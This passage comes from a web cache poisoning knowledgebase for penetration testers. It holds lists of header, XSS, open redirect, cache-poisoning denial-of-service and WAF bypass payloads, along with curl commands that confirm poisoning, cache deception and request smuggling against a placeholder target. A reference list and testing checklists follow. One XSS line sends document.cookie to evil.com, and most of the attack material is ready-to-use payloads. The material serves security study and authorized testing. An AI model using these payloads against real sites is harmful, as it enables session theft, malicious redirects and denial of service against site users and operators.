X-True-Client-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: http://evil.com

# CDN-specific
CF-Connecting-IP: 127.0.0.1
CF-Visitor: {"scheme":"http"}
CF-Worker: test
Fastly-Client-IP: 127.0.0.1
Fastly-FF: test
True-Client-IP: 127.0.0.1
CloudFront-Forwarded-Proto: http
X-Ama-Website-Redirect-Location: evil.com
X-Aman-CDN-Cache: test
```

### 27.2 XSS Payloads for Cache Poisoning

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>fetch('https://evil.com/?c='+document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<link rel=stylesheet href=javascript:alert(1)>
<meta http-equiv=refresh content=0;url=javascript:alert(1)>
<input onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<details open ontoggle=alert(1)>
```

### 27.3 Open Redirect Payloads

```
//evil.com
https://evil.com
http://evil.com
\\evil.com
//evil.com/@target.com
https://target.com.evil.com
https://evil.com/target.com
https://target.com?evil.com
https://target.com#evil.com
https://evil.com%00target.com
https://evil.com?target.com
https://target.com/\evil.com
https://target.com/..\evil.com
```

### 27.4 CPDoS Payloads

```http
# Oversized header
X-Oversized: A...(10MB)...A

# Malformed Range
Range: bytes=100-90
Range: bytes=abc
Range: bytes=-

# Invalid method override
X-HTTP-Method-Override: NONSENSE
X-HTTP-Method-Override: <script>alert(1)</script>

# Invalid Authorization
Authorization: Bearer invalid_token
Authorization: Basic invalid

# Invalid Content-Type
Content-Type: application/invalid

# Invalid Accept
Accept: application/invalid

# Invalid If-Modified-Since
If-Modified-Since: invalid-date

# Invalid If-None-Match
If-None-Match: invalid-etag
```

---

## 28. WAF Bypasses

### 28.1 Header Case Variation

```http
x-forwarded-host: evil.com
X-FORWARDED-HOST: evil.com
X-Forwarded-Host: evil.com
x-Forwarded-Host: evil.com
```

### 28.2 Header Encoding

```http
X-Forwarded-Host: evil%2ecom
X-Forwarded-Host: evil%252ecom
X-Forwarded-Host: evil\x2ecom
X-Forwarded-Host: evil\u002ecom
```

### 28.3 Multiple Headers

```http
X-Forwarded-Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Host: target.com
X-Forwarded-Host: evil.com
```

### 28.4 Header Injection via CRLF

```http
X-Custom: value\r\nX-Forwarded-Host: evil.com
```

### 28.5 Unicode Normalization

```http
X-Forwarded-Host: evil％2ecom  # Full-width percent
X-Forwarded-Host: evil．com    # Full-width dot
```

### 28.6 Comment Injection

```http
X-Forwarded-Host: target.com/*evil.com*/
X-Forwarded-Host: target.com<!--evil.com-->
```

### 28.7 Path Traversal in Header

```http
X-Forwarded-Host: ../evil.com
X-Forwarded-Host: ..\evil.com
X-Forwarded-Host: .%2fevil.com
```

---

## 29. Detection Techniques

### 29.1 Cache Hit/Miss Detection

```bash
# Check for cache headers
curl -I https://target.com | grep -iE "x-cache|cf-cache|age|x-served-by"

# Time-based detection
for i in {1..5}; do
    time curl -s https://target.com > /dev/null
done

# Size-based detection
curl -s https://target.com | wc -c
curl -s https://target.com | wc -c
```

### 29.2 Unkeyed Input Detection

```bash
# Test header reflection
for header in X-Forwarded-Host X-Forwarded-For X-Custom; do
    curl -s -H "$header: CANARY_1234" https://target.com | grep CANARY_1234
done

# Test parameter reflection
for param in utm_source utm_medium ref source; do
    curl -s "https://target.com/?$param=CANARY_1234" | grep CANARY_1234
done
```

### 29.3 Cache Poisoning Confirmation

```bash
# Step 1: Poison with cache-buster
curl -s "https://target.com/?cb=1234" -H "X-Forwarded-Host: evil.com"

# Step 2: Check if poisoned
curl -s "https://target.com/?cb=1234" | grep evil.com

# Step 3: Verify without cache-buster (confirm stored)
curl -s "https://target.com/" | grep evil.com
```

### 29.4 Cache Deception Confirmation

```bash
# Step 1: Access dynamic endpoint with static extension
curl -s -b "session=valid" "https://target.com/my-account;.js" > account_js.html

# Step 2: Access without authentication
curl -s "https://target.com/my-account;.js" > account_js_unauth.html

# Step 3: Compare
diff account_js.html account_js_unauth.html
```

### 29.5 Request Smuggling Detection

```bash
# CL.TE test
curl -X POST https://target.com \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d "5\r\nGPOST\r\n0\r\n\r\n"

# TE.CL test
curl -X POST https://target.com \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\n\r\nG"
```

---

## 30. References

### 30.1 PortSwigger Research

1. **Practical Web Cache Poisoning** (2018) - James Kettle
   - https://portswigger.net/research/practical-web-cache-poisoning

2. **Web Cache Entanglement** (2020) - James Kettle
   - https://portswigger.net/research/web-cache-entanglement

3. **Gotta Cache 'Em All** (2020) - James Kettle
   - https://portswigger.net/research/gotta-cache-em-all

4. **Responsible Denial of Service with Web Cache Poisoning** (2020)
   - https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning

5. **Browser-Powered Desync Attacks** (2022) - James Kettle
   - https://portswigger.net/research/browser-powered-desync-attacks

6. **HTTP/1.1 Must Die: The Desync Endgame** (2025) - James Kettle
   - https://portswigger.net/research/http1-must-die

7. **Hidden OAuth Attack Vectors** (2021)
   - https://portswigger.net/research/hidden-oauth-attack-vectors

### 30.2 Web Security Academy Labs

1. Web Cache Poisoning Fundamentals
   - https://portswigger.net/web-security/web-cache-poisoning

2. Exploiting Cache Design Flaws
   - https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws

3. Exploiting Implementation Flaws
   - https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

4. Lab: Web cache poisoning with an unkeyed header
   - https://portswigger.net/web-security/web-cache-poisoning/lab-web-cache-poisoning-with-an-unkeyed-header

5. Lab: Web cache poisoning with an unkeyed cookie
   - https://portswigger.net/web-security/web-cache-poisoning/lab-web-cache-poisoning-with-an-unkeyed-cookie

6. Lab: Web cache poisoning with multiple headers
   - https://portswigger.net/web-security/web-cache-poisoning/lab-multiple-headers

7. Lab: Web cache poisoning with fat GET
   - https://portswigger.net/web-security/web-cache-poisoning/lab-fat-get

8. Lab: Web cache poisoning via DOM
   - https://portswigger.net/web-security/web-cache-poisoning/lab-cache-poisoning-via-dom

9. Web Cache Deception
   - https://portswigger.net/web-security/web-cache-deception

10. Lab: Exploiting HTTP request smuggling to perform web cache poisoning
    - https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning

### 30.3 GitHub Repositories

1. **PayloadsAllTheThings - Web Cache Poisoning**
   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Poisoning

2. **Web Cache Vulnerability Scanner (WCVS)**
   - https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner

3. **Param Miner**
   - https://github.com/PortSwigger/param-miner

4. **HTTP Request Smuggler**
   - https://github.com/PortSwigger/http-request-smuggler

5. **Smuggler**
   - https://github.com/defparam/smuggler

6. **Nuclei Templates - Cache**
   - https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration/cache

7. **Cache Poisoning Payload List**
   - https://github.com/payloadbox/cache-poisoning-payload-list

8. **Bug Bounty Cache Poisoning**
   - https://github.com/0xspade/bugbounty/tree/master/cache-poisoning

### 30.4 Documentation

1. **MDN - HTTP Caching**
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching

2. **MDN - Cache-Control**
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control

3. **MDN - Vary**
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary

4. **MDN - ETag**
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag

5. **MDN - X-Forwarded-Host**
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host

### 30.5 HackTricks

1. **Cache Poisoning and Cache Deception**
   - https://hacktricks.wiki/en/pentesting-web/cache-deception/index.html
   - https://book.hacktricks.wiki/en/pentesting-web/cache-deception/index.html

### 30.6 Academic Papers

1. **Detecting and Measuring Web Cache Poisoning in the Wild** (CCS 2024)
   - https://www.jianjunchen.com/p/web-cache-posioning.CCS24.pdf

2. **Web Cache Deception Escalates!** (USENIX Security 2022)
   - https://www.usenix.org/system/files/sec22summer_mirheidari.pdf

3. **Automated Scanning for Web Cache Poisoning Vulnerabilities** (Thesis)
   - https://hackmanit.de/images/download/thesis/Automated-Scanning-for-Web-Cache-Poisoning-Vulnerabilities.pdf

4. **A Methodology for Web Cache Deception Vulnerability Detection**
   - https://air.unimi.it/retrieve/7df93d97-538a-4df6-9355-7625561e0416/CLOSER_2024_36_CR%20%281%29.pdf

5. **Exploration of browser-powered desync attacks via HTTP/3**
   - https://repository.library.northeastern.edu/files/neu:4f236k59w/fulltext.pdf

### 30.7 Blog Posts & Writeups

1. **Automate Cache Poisoning Vulnerability - Nuclei**
   - https://melbadry9.gitbook.io/blog/write-ups/fuzzing/nuclei-cache-poisoning

2. **Cache Poisoning using Nuclei**
   - https://gitbook.seguranca-informatica.pt/fuzzing-and-web/cache-poisoning-using-nuclei

3. **Analyzing the Reflection Nuclei Template**
   - https://medium.com/@angryovalegg/analyzing-the-reflection-nuclei-template-436a2068fbaf

4. **Web Cache Deception (Bug Bounty)**
   - https://medium.com/@shahzaiblang2842/web-cache-deception-bug-bounty-581347765afc

5. **Host Header Injection: Poisoning Caches and Stealing Password Reset Tokens**
   - https://medium.com/@instatunnel/host-header-injection-poisoning-caches-and-stealing-password-reset-tokens-46ff184e2694

6. **HTTP Request Smuggling - Web Cache Poisoning Writeup**
   - https://sc.scomurr.com/http-request-smuggling-web-cache-poisoning/

7. **Exploiting HTTP request smuggling to perform web cache poisoning**
   - https://medium.com/@Zer0DayDreamer/exploiting-http-request-smuggling-to-perform-web-cache-poisoning-660082cb3985

8. **Desync Attacks: Request Smuggling's Evil Twin**
   - https://medium.com/@instatunnel/desync-attacks-request-smugglings-evil-twin-d32fa2275a5d

9. **Client-Side Desync Attack Explained**
   - https://redbotsecurity.com/client-side-desync/

10. **Web Cache Entanglement - Novel Pathways to Poisoning**
    - https://blog.detectify.com/industry-insights/web-cache-entanglement-novel-pathways-to-poisoning/

11. **The ultimate Bug Bounty guide to HTTP request smuggling**
    - https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities

### 30.8 HackerOne Reports

1. **Basecamp - HTTP request smuggling on Basecamp 2**
   - https://hackerone.com/reports/919175

### 30.9 CVEs

1. **CVE-2024-46452** - Craft CMS Host Header Injection
2. **CVE-2024-40686** - IBM SmartCloud Analytics Host Header Injection
3. **CVE-2024-28397** - Js2py Sandbox Escape
4. **CVE-2023-33733** - Reportlab Xhtml2pdf Expression Evaluation RCE

---

## Appendix A: Quick Reference Card

### A.1 Cache Poisoning Checklist

```
□ Identify cache behavior (headers, hit/miss)
□ Discover cacheable endpoints
□ Find unkeyed inputs (headers, params, cookies)
□ Test input reflection in response
□ Craft payload based on reflection context
□ Use cache-buster during testing
□ Confirm poisoning (remove cache-buster, verify hit)
□ Assess impact (XSS, redirect, DoS, data theft)
□ Document reproduction steps
□ Suggest remediation
```

### A.2 Cache Deception Checklist

```
□ Identify static extension cache rules
□ Test delimiter discrepancies
□ Test path traversal normalization
□ Verify dynamic content cached with static URL
□ Test without authentication
□ Confirm sensitive data exposure
□ Document reproduction steps
□ Suggest remediation
```

### A.3 Request Smuggling + Cache Checklist

```
□ Identify CL.TE or TE.CL vulnerability
□ Find cacheable endpoint for poisoning
□ Craft smuggled request to poison cache
□ Time second request to hit poisoned cache
□ Verify cache poisoning persists
□ Assess impact (XSS, redirect, DoS)
□ Document reproduction steps
□ Suggest remediation
```

### A.4 Common Cache Headers Reference

| Header | Meaning | Example |
|--------|---------|---------|
| Cache-Control | Caching directives | public, max-age=3600 |
| Expires | Expiration date | Tue, 28 Feb 2022 22:22:22 GMT |
| Age | Response age in seconds | 42 |
| ETag | Entity tag for validation | "33a64df5" |
| Last-Modified | Modification date | Tue, 22 Feb 2022 22:00:00 GMT |
| Vary | Cache key headers | Accept-Encoding |
| X-Cache | Cache status (Varnish) | hit |
| X-Cache-Status | Cache status (nginx) | HIT |
| CF-Cache-Status | Cloudflare status | HIT |
| X-Served-By | Server identifier | cache-ams21033-AMS |
| X-Timer | Response time | S12345 |
| X-Cache-Hits | Hit count | 1 |
| Surrogate-Control | CDN-specific | max-age=3600 |
| CDN-Cache-Control | Standardized CDN | max-age=3600 |

### A.5 Common Vulnerable Frameworks/Technologies

| Technology | Vulnerability Pattern | Header |
|------------|---------------------|--------|
| Django | request.build_absolute_uri() | X-Forwarded-Host |
| Rails | url_for(), request.host | X-Forwarded-Host |
| Laravel | Trusted proxy configuration | X-Forwarded-* |
| Express | trust proxy setting | X-Forwarded-* |
| Flask | url_for() | X-Forwarded-Host |
| Spring | Forwarded header filter | Forwarded |
| Ratpack | Default PublicAddress | X-Forwarded-Host |
| Nginx | Proxy pass headers | X-Real-IP |
| Apache | mod_proxy | X-Forwarded-* |
| Varnish | Default VCL | Various |
| Cloudflare | Worker abuse | CF-* |
| Fastly | VCL logic | Fastly-* |
| Akamai | EdgeSuite | Akamai-* |

---

> **End of Document**
> 
> This knowledgebase is compiled from extensive research across PortSwigger's Web Security Academy, academic papers, real-world bug bounty reports, and open-source security tools. Use responsibly for authorized security testing only.
> 
> **License**: Research/Educational Use | **Maintained by**: Security Research Community
